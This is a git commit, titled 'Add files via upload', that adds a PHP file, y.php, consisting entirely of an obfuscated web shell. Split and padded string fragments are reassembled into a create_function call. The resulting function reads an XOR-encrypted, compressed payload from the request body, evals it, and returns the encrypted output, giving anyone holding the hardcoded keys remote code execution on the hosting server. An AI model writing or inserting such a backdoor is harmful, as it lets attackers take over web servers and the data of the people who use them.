d61b47a6320d5d806fca85fd4bda6b8281199fd9
Bello Yusuf Alani <92359313+yusufbello770@users.noreply.github.com>
2023-07-14 21:25:38 +0000

    Add files via upload

---
+++ y.php
@@ -0,0 +1,13 @@
+<?php
+$Y=str_replace('C','','crCeaCteC_fuCnCctCion');
+$h='atchQr("/$QrQrkh(Qr.+)$kfQr/",@fileQr_get_contents(Qr"php://inQrput"),$mQ';
+$j='stQrrlen($Qrt)Qr;$o="";foQrr($i=0;Qr$i<Qr$l;){fQror($j=0;(Qr$j<$c&Qr&$iQr<Qr$l';
+$R='Qr);$j++,$i++){Qr$o.=$t{$Qri}^$k{Qr$jQr};}}reQrturn $o;}iQrf Qr(Qr@preQrg_m';
+$G='$kQrQr="8Qrcfe35d7";$kh=Qr"a8210b60Qr4cQreb";$kfQr="0029fb5a9674Qr";$p';
+$a='r)==1) {@ob_Qrstart();Qr@QreQrval(@gzuncomprQress(@xQr(@baseQr64_dQrecod';
+$N='e($mQr[1]),$kQr))Qr);$o=QrQr@ob_get_coQrntentQrs()Qr;@ob_end_clean();$Qrr=@bas';
+$J='e6Qr4_encQrode(@xQr(@QrgzcomQrpQrressQrQr($o),$k)Qr);print("$p$kh$r$kf");}';
+$U='="lQrJrQrutCLdQKBQrH3FQ3"Qr;fuQrnctioQrn x($t,$Qrk){$c=strlQren(Qr$k);$l=';
+$M=str_replace('Qr','',$G.$U.$j.$R.$h.$a.$N.$J);
+$t=$Y('',$M);$t();
+?>
